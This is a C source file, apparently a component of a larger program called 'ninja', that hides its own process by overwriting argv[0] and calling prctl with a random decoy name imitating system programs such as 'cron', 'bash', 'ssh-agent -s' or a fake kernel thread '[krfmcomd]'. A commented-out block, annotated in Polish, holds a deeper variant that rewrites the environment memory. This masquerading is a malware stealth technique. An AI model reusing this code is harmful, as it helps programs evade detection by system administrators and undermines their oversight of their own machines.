#include "ninja.h"
#include <string.h>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/user.h>
#include <sys/prctl.h>

struct ninja_data
{
    int argv0size;
    int argc;
    char **argv;
};

struct ninja_data ninja;

extern char **environ;

void init_ninja(int argc, char **argv){

    ninja.argv = argv;
    ninja.argc = argc;
    ninja.argv0size = strlen(argv[0]);

}

void hide_ninja(){
    int r;
    const char* title;
    r = rand() % 8;

    switch(r){
    case 0:
        title = "ps";
        break;

    case 1:
        title = "cron";
        break;

    case 2:
        title = "bash";
       break;

    case 3:
        title = "/bin/cat";
        break;

    case 4:
        title = "[krfmcomd]";
        break;

    case 5:
        title = "audio";
        break;
        
    case 6:
        title = "network";
        break;
        
    case 7:
        title = "ssh-agent -s";
        break;
    }


    strncpy(ninja.argv[0],title,ninja.argv0size);
    prctl(PR_SET_NAME, (unsigned long) title, 0, 0, 0);

    /* Tutaj głębsza próba ukrycia nazwy procesu,
     * działa z innymi procesami, jednak w przypadku naszego
     * programu powoduje segmentation fault podczas późniejsz pracy procesu

    static unsigned int size = 0;
    if(!size){
        int env_len = -1;
        if (environ)
            while (environ[++env_len])
                ;

        if (env_len > 0)
            size = environ[env_len-1] + strlen(environ[env_len-1]) - ninja.argv[0];
        else
            size = ninja.argv[ninja.argc-1] + strlen(ninja.argv[ninja.argc-1]) - ninja.argv[0];

        if (environ)
        {

            char **new_environ = (char**)malloc(env_len*sizeof(char*));

            unsigned int i = -1;
            while (environ[++i])
                new_environ[i] = strdup(environ[i]);

            environ = new_environ;
        }
    }
    
    memset(ninja.argv[0], '\0', size);
    snprintf(ninja.argv[0], size - 1, title, size);
*/


}

